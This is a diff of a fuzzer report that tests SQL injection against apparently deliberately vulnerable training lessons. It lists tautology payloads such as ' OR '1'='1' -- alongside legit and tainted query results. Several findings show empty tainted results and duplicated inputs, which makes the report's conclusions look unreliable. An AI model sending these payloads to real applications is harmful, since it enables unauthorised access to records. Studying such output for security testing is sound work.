@@ -1,2 +1,98 @@
 FUZZER REPORT : 
-Potential SQL Injection found in Assignment 5b parameter stringOriginal query: 0Tainted query: 001' OR '1'='1Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]Tainted result: []Potential SQL Injection found in Assignment 5b parameter stringOriginal query: 0Tainted query: 001' OR '1'='1' -- Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]Tainted result: []Potential SQL Injection found in Assignment 5b parameter stringOriginal query: 0Tainted query: 00' OR ''='Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]Tainted result: []Potential SQL Injection found in Assignment 5b parameter stringOriginal query: 101Tainted query: 1011011' OR '1'='1Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]Tainted result: []Potential SQL Injection found in Assignment 5b parameter stringOriginal query: 101Tainted query: 1011011' OR '1'='1' -- Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]Tainted result: []Potential SQL Injection found in Assignment 5b parameter stringOriginal query: 101Tainted query: 101101' OR ''='Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]Tainted result: []No SQL Injection found in Assignment 5b parameter stringNo SQL Injection found in Assignment 5b parameter string
+
+
+Potential SQL Injection found in Lesson 2 parameter query
+Original query: Select department from employees where last_name = 'Franco'
+Tainted query: Select department from employees where last_name = 'Franco'Select department from employees where last_name = 'Franco'1' OR '1'='1
+Legit result: [{"DEPARTMENT": "Marketing"}]
+Tainted result: []
+
+
+Potential SQL Injection found in Lesson 2 parameter query
+Original query: Select department from employees where last_name = 'Franco'
+Tainted query: Select department from employees where last_name = 'Franco'Select department from employees where last_name = 'Franco'1' OR '1'='1' -- 
+Legit result: [{"DEPARTMENT": "Marketing"}]
+Tainted result: []
+
+
+Potential SQL Injection found in Lesson 2 parameter query
+Original query: Select department from employees where last_name = 'Franco'
+Tainted query: Select department from employees where last_name = 'Franco'Select department from employees where last_name = 'Franco'' OR ''='
+Legit result: [{"DEPARTMENT": "Marketing"}]
+Tainted result: []
+
+No SQL Injection found in Lesson 2 parameter query
+
+
+Potential SQL Injection found in Assignment 5b parameter string
+Original query: 0
+Tainted query: 001' OR '1'='1
+Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]
+Tainted result: []
+
+
+Potential SQL Injection found in Assignment 5b parameter string
+Original query: 0
+Tainted query: 001' OR '1'='1' -- 
+Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]
+Tainted result: []
+
+
+Potential SQL Injection found in Assignment 5b parameter string
+Original query: 0
+Tainted query: 00' OR ''='
+Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]
+Tainted result: []
+
+
+Potential SQL Injection found in Assignment 5b parameter string
+Original query: 101
+Tainted query: 1011011' OR '1'='1
+Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]
+Tainted result: []
+
+
+Potential SQL Injection found in Assignment 5b parameter string
+Original query: 101
+Tainted query: 1011011' OR '1'='1' -- 
+Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]
+Tainted result: []
+
+
+Potential SQL Injection found in Assignment 5b parameter string
+Original query: 101
+Tainted query: 101101' OR ''='
+Legit result: [{"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "987654321", "CC_TYPE": "VISA", "COOKIE": "", "LOGIN_COUNT": "0"}, {"USERID": "101", "FIRST_NAME": "Joe", "LAST_NAME": "Snow", "CC_NUMBER": "2234200065411", "CC_TYPE": "MC", "COOKIE": "", "LOGIN_COUNT": "0"}]
+Tainted result: []
+
+No SQL Injection found in Assignment 5b parameter string
+
+No SQL Injection found in Assignment 5b parameter string
+
+
+Potential SQL Injection found in Assignment 5a parameter string
+Original query: Smith
+Tainted query: SmithSmith1' OR '1'='1' -- 
+Legit result: [{"USERID": "37648", "FIRST_NAME": "37648", "LAST_NAME": "John", "DEPARTMENT": "Smith"}]
+Tainted result: [{"USERID": "32147", "FIRST_NAME": "32147", "LAST_NAME": "Paulina", "DEPARTMENT": "Travers"}]
+
+
+Potential SQL Injection found in Assignment 5a parameter string
+Original query: 3SL99A
+Tainted query: 3SL99A3SL99A1' OR '1'='1
+Legit result: [{"USERID": "37648", "FIRST_NAME": "37648", "LAST_NAME": "John", "DEPARTMENT": "Smith"}]
+Tainted result: [{"USERID": "32147", "FIRST_NAME": "32147", "LAST_NAME": "Paulina", "DEPARTMENT": "Travers"}]
+
+
+Potential SQL Injection found in Assignment 5a parameter string
+Original query: 3SL99A
+Tainted query: 3SL99A3SL99A1' OR '1'='1' -- 
+Legit result: [{"USERID": "37648", "FIRST_NAME": "37648", "LAST_NAME": "John", "DEPARTMENT": "Smith"}]
+Tainted result: [{"USERID": "32147", "FIRST_NAME": "32147", "LAST_NAME": "Paulina", "DEPARTMENT": "Travers"}]
+
+
+Potential SQL Injection found in Assignment 5a parameter string
+Original query: 3SL99A
+Tainted query: 3SL99A3SL99A' OR ''='
+Legit result: [{"USERID": "37648", "FIRST_NAME": "37648", "LAST_NAME": "John", "DEPARTMENT": "Smith"}]
+Tainted result: [{"USERID": "32147", "FIRST_NAME": "32147", "LAST_NAME": "Paulina", "DEPARTMENT": "Travers"}]
